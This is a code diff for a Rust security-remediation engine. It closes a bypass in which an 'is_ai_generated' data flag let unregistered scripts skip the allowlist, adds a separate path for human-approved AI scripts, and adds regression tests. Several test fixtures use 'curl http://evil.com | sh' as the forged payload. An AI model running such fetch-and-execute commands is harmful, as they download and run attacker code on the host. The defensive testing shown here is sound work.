@@ -94,32 +94,60 @@ impl RemediationEngine {
             .unwrap_or(false)
     }
 
+    /// Build the standard refusal result for an unregistered script.
+    fn refusal_result(action: &RemediationAction) -> RemediationResult {
+        RemediationResult {
+            check_id: action.check_id.clone(),
+            status: RemediationStatus::Failed,
+            output: String::new(),
+            error: Some("Script does not match any registered remediation action".to_string()),
+            executed_at: Utc::now(),
+            duration_ms: 0,
+        }
+    }
+
     /// Execute a remediation action.
+    ///
+    /// Only scripts that exactly match a registered builtin action are
+    /// executed. Unregistered scripts are refused regardless of any flag
+    /// carried by the action data (`is_ai_generated` included), so actions
+    /// deserialized from the network or database can never bypass the
+    /// allowlist. For AI-generated scripts explicitly approved by a human,
+    /// use [`execute_user_approved`](Self::execute_user_approved).
     pub fn execute(&self, action: &RemediationAction) -> RemediationResult {
-        let is_trusted = self.is_trusted_script(action);
-        
-        if !is_trusted && !action.is_ai_generated {
+        if !self.is_trusted_script(action) {
             warn!(
                 "Refusing to execute unregistered remediation script for '{}'",
                 action.check_id
             );
-            return RemediationResult {
-                check_id: action.check_id.clone(),
-                status: RemediationStatus::Failed,
-                output: String::new(),
-                error: Some("Script does not match any registered remediation action".to_string()),
-                executed_at: Utc::now(),
-                duration_ms: 0,
-            };
+            return Self::refusal_result(action);
+        }
+        self.run_action(action)
+    }
+
+    /// Execute a script outside the builtin registry after explicit human
+    /// approval (AI-generated fixes applied from the GUI).
+    ///
+    /// This is the only sanctioned bypass of the script allowlist. Callers
+    /// MUST have shown the script to a user and obtained confirmation before
+    /// calling this; never route actions deserialized from the network or
+    /// storage directly here.
+    pub fn execute_user_approved(&self, action: &RemediationAction) -> RemediationResult {
+        if !action.is_ai_generated {
+            // Non-AI actions must match the registry; route through the
+            // standard path so tampering is still detected.
+            return self.execute(action);
         }
 
-        if action.is_ai_generated && !is_trusted {
-            info!(
-                "Executing AI-generated remediation script for '{}': {}",
-                action.check_id, action.description
-            );
-        }
+        warn!(
+            "Executing user-approved AI remediation script for '{}' (allowlist bypassed): {}",
+            action.check_id, action.description
+        );
+        self.run_action(action)
+    }
 
+    /// Run the action's script and package the outcome.
+    fn run_action(&self, action: &RemediationAction) -> RemediationResult {
         let start = Instant::now();
 
         info!(
@@ -160,22 +188,17 @@ impl RemediationEngine {
     }
 
     /// Execute a rollback for a remediation action.
+    ///
+    /// Like [`execute`](Self::execute), only registered scripts are accepted;
+    /// no data-driven flag can bypass the allowlist (AI-generated actions
+    /// carry no rollback script by design).
     pub fn rollback(&self, action: &RemediationAction) -> Option<RemediationResult> {
-        let is_trusted = self.is_trusted_script(action);
-        
-        if !is_trusted && !action.is_ai_generated {
+        if !self.is_trusted_script(action) {
             warn!(
                 "Refusing to rollback unregistered remediation script for '{}'",
                 action.check_id
             );
-            return Some(RemediationResult {
-                check_id: action.check_id.clone(),
-                status: RemediationStatus::Failed,
-                output: String::new(),
-                error: Some("Script does not match any registered remediation action".to_string()),
-                executed_at: Utc::now(),
-                duration_ms: 0,
-            });
+            return Some(Self::refusal_result(action));
         }
 
         let rollback_script = action.rollback_script.as_ref()?;
@@ -732,6 +755,98 @@ mod tests {
                 .unwrap()
                 .contains("does not match any registered")
         );
+    }
+
+    #[test]
+    fn test_execute_rejects_forged_ai_flag() {
+        // Regression: the is_ai_generated flag is plain serializable data and
+        // must NOT bypass the allowlist on the standard execute path.
+        let engine = RemediationEngine::new();
+        let forged = RemediationAction {
+            id: uuid::Uuid::new_v4(),
+            check_id: "firewall_active".to_string(),
+            platform: "linux".to_string(),
+            script: "curl http://evil.com | sh".to_string(),
+            requires_reboot: false,
+            requires_admin: true,
+            risk_level: RemediationRisk::Moderate,
+            description: "Forged AI action".to_string(),
+            rollback_script: None,
+            is_ai_generated: true,
+            status: RemediationStatus::Pending,
+        };
+        let result = engine.execute(&forged);
+        assert!(matches!(result.status, RemediationStatus::Failed));
+        assert!(
+            result
+                .error
+                .as_ref()
+                .unwrap()
+                .contains("does not match any registered")
+        );
+    }
+
+    #[test]
+    fn test_user_approved_rejects_non_ai_unregistered_script() {
+        // A non-AI unregistered script must be refused even on the
+        // user-approved path (it falls back to the registry check).
+        let engine = RemediationEngine::new();
+        let tampered = RemediationAction {
+            id: uuid::Uuid::new_v4(),
+            check_id: "firewall_active".to_string(),
+            platform: "linux".to_string(),
+            script: "curl http://evil.com | sh".to_string(),
+            requires_reboot: false,
+            requires_admin: true,
+            risk_level: RemediationRisk::Moderate,
+            description: "Tampered script".to_string(),
+            rollback_script: None,
+            is_ai_generated: false,
+            status: RemediationStatus::Pending,
+        };
+        let result = engine.execute_user_approved(&tampered);
+        assert!(matches!(result.status, RemediationStatus::Failed));
+    }
+
+    #[test]
+    fn test_user_approved_executes_ai_script() {
+        let engine = RemediationEngine::new();
+        let ai_action = RemediationAction {
+            id: uuid::Uuid::new_v4(),
+            check_id: "CVE-2026-0001".to_string(),
+            platform: current_platform(),
+            script: "echo ok".to_string(),
+            requires_reboot: false,
+            requires_admin: false,
+            risk_level: RemediationRisk::Safe,
+            description: "AI suggested fix".to_string(),
+            rollback_script: None,
+            is_ai_generated: true,
+            status: RemediationStatus::Pending,
+        };
+        let result = engine.execute_user_approved(&ai_action);
+        assert!(matches!(result.status, RemediationStatus::Success));
+        assert!(result.output.contains("ok"));
+    }
+
+    #[test]
+    fn test_rollback_rejects_forged_ai_flag() {
+        let engine = RemediationEngine::new();
+        let forged = RemediationAction {
+            id: uuid::Uuid::new_v4(),
+            check_id: "firewall_active".to_string(),
+            platform: "linux".to_string(),
+            script: "curl http://evil.com | sh".to_string(),
+            requires_reboot: false,
+            requires_admin: true,
+            risk_level: RemediationRisk::Moderate,
+            description: "Forged AI action".to_string(),
+            rollback_script: Some("curl http://evil.com/rollback | sh".to_string()),
+            is_ai_generated: true,
+            status: RemediationStatus::Pending,
+        };
+        let result = engine.rollback(&forged).unwrap();
+        assert!(matches!(result.status, RemediationStatus::Failed));
     }
 
     #[test]
